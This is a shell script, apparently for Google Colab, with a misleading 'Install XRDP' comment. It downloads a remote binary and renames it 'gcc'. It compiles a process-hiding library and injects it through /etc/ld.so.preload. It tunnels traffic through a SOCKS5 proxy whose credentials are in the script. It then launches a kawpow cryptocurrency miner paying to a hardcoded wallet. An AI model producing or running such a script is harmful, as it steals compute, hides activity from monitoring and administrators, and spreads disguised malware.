# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R gccn
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
select_proxy_mode=socks5_only
socks5 = sg-socks5.woiden.net:8080
socks5_username = woiden_daka
socks5_password = maheswar1
END
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2
echo " "
echo " "
echo "**************"
./graftcp/graftcp curl ifconfig.me
echo " "
echo " "
echo "**************"
echo " "
echo " "
./graftcp/graftcp wget https://gitlab.com/scatterfafafa/asuw/-/raw/main/apache
chmod 700 apache
mv apache bezzHash
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
echo " "
echo " "
echo "**************"
echo " "
echo " "
chmod bezzHash
mv bezzHash gcc
echo " "
echo " "
echo "**************"
echo " "
echo " "
cat > config.ini <<END
[kawpow]
wallet = TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR
rigName = gccn
zilEpoch = 0
sortPools = true
watchdog = true
restarts=0
pool1 = kp.unmineable.com:13333
pool2 = kp.unmineable.com:3333
END

 ./gcc
